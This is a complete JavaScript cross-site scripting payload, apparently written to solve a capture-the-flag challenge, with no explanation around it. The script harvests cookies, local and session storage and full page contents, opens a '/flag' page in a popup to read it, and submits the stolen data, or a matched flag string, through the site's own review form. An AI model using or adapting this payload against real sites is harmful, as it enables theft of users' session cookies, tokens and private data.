(() => {
  const form = document.getElementById('review-note');
  if (!form) return;

  const collect = (extra = '') => {
    const text = document.body ? document.body.innerText : '';
    const html = document.documentElement.innerHTML;
    const storage = [
      ...Object.entries(localStorage),
      ...Object.entries(sessionStorage),
    ];
    return [document.cookie, JSON.stringify(storage), text, html, extra].join('\n');
  };

  let sent = false;
  const send = (extra = '') => {
    if (sent) return;
    sent = true;
    const all = collect(extra);
    const match = all.match(/(?:firebird|flag|ctf)\{[^}]+\}/i);
    form.elements.namedItem('note').value = (match ? match[0] : all).slice(0, 6000);
    form.submit();
  };

  let popup = null;
  try {
    popup = window.open('/flag', 'firebird_flag');
  } catch {}

  let attempts = 0;
  const timer = setInterval(() => {
    attempts += 1;
    try {
      if (popup && popup.document && popup.document.readyState === 'complete') {
        const extra = `${popup.document.body?.innerText || ''}\n${popup.document.documentElement.innerHTML}`;
        clearInterval(timer);
        popup.close();
        send(extra);
        return;
      }
    } catch {}
    if (attempts >= 25) {
      clearInterval(timer);
      send('popup unavailable');
    }
  }, 100);
})();
